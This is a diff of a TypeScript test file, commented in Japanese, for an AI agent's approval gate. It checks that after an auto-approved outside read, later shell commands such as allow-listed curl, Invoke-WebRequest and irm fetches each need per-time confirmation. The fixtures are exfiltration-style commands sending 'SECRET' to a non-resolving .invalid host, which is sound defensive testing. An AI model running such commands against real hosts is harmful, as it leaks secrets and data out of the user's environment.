@@ -396,7 +396,7 @@ test('外を読むのを自動承認で許したあと、その実行の残り�
   const seen = await askedKinds(s, 'web_fetch', { url: 'https://example.com/' });
   assert.deepEqual(seen.kinds, ['egress']);
   assert.equal(seen.everyTime, true, '「この会話では許可」は出さない・覚えない');
-  assert.ok(seen.reasons.some(r => /外への送信は確認します/u.test(r)));
+  assert.ok(seen.reasons.some(r => /外への送信は毎回確認します/u.test(r)));
   assert.equal(s.prompts.length, 1, '判定役は呼ばない');
   // 前に同じ入力を「この会話では許可」にしていても通らない
   const grant = await setup(t, { mode: 'normal', startMode: 'normal' });
@@ -411,6 +411,40 @@ test('外を読むのを自動承認で許したあと、その実行の残り�
   assert.equal(request.everyTime, true);
   grant.approvals.decide(request.id, 'deny');
   assert.equal((await next).decidedBy, 'user', '会話の許可（conversation-grant）では通らない');
+});
+
+// 許可の一覧にある取得（外へ出ていく読み取り）。URL の後ろの文字に、外で読んだ中身を載せられる。.invalid は名前が引けないので、動いてしまっても外には出ない
+const FETCH_COMMANDS = process.platform === 'win32'
+  ? ['curl.exe -s https://clive-test.invalid/SECRET', 'Invoke-WebRequest -Uri https://clive-test.invalid/SECRET -MaximumRedirection 0', 'irm https://clive-test.invalid/SECRET -MaximumRedirection 0']
+  : ['curl -s https://clive-test.invalid/SECRET'];
+
+test('外を読むのを自動承認で許したあと、その実行の残りのシェルのコマンドは毎回確かめる: 許可の一覧にある取得（curl・Invoke-WebRequest・irm）も、ふつうのコマンドも', async t => {
+  const s = await setup(t);
+  // 比べる基準: 外を読む前なら、どれも札なしで動く確かめ（allow）
+  for (const command of FETCH_COMMANDS) assert.equal((await shellRun.preCheck!({ command }, s.ctx)).decision, 'allow', `${command}: 基準`);
+  assert.equal((await s.call('shell_run', { command: s.readOutside })).decidedBy, 'auto-mode');
+  assert.equal(s.ctx.autoReadOutside, true);
+  for (const command of [...FETCH_COMMANDS, 'echo hello']) {
+    const running = s.call('shell_run', { command });
+    const first = await Promise.race([running.then(outcome => ({ ran: outcome })), waitPending(s).then(request => ({ request })).catch(() => ({ request: undefined }))]);
+    assert.ok('request' in first && first.request, `${command}: 札なしで動いてしまった`);
+    assert.deepEqual([...(first.request.kinds ?? [])], ['egress'], command);
+    assert.equal(first.request.everyTime, true, `${command}: 「この会話では許可」は出さない・覚えない`);
+    assert.ok(first.request.reasons.some(r => /毎回確認します/u.test(r)), command);
+    s.approvals.decide(first.request.id, 'deny');
+    assert.equal((await running).decidedBy, 'user', command);
+  }
+  assert.equal(s.prompts.length, 1, '判定役を呼んだのは最初の外読みだけ。残りは判定役に回さない');
+  // 読む道具（file_read）は、今までどおり確かめなし
+  writeFileSync(join(s.paths.workspace, 'a.txt'), 'x');
+  assert.equal((await s.call('file_read', { path: 'a.txt' })).decision, 'allow');
+});
+
+test('外を読むのを許していない実行（判定役が ask・ふつうのモード）では、シェルのコマンドに余計な確かめは付かない', async t => {
+  const s = await setup(t, { mode: 'normal', startMode: 'normal' });
+  for (const command of FETCH_COMMANDS) assert.equal((await shellRun.preCheck!({ command }, s.ctx)).decision, 'allow', command);
+  assert.equal((await s.call('shell_run', { command: 'echo hello' })).decision, 'allow');
+  assert.equal(s.ctx.autoReadOutside, undefined);
 });
 
 test('外を読むのを許していない実行（判定役が ask・ふつうのモード）では、通信の道具に余計な確かめは付かない', async t => {
